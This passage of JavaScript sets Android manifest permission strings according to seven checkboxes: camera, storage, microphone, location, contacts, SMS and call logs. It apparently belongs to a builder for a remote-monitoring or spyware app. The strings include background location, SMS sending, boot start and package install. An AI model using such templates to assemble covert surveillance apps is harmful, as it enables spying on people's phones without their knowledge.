            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
        //if four are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
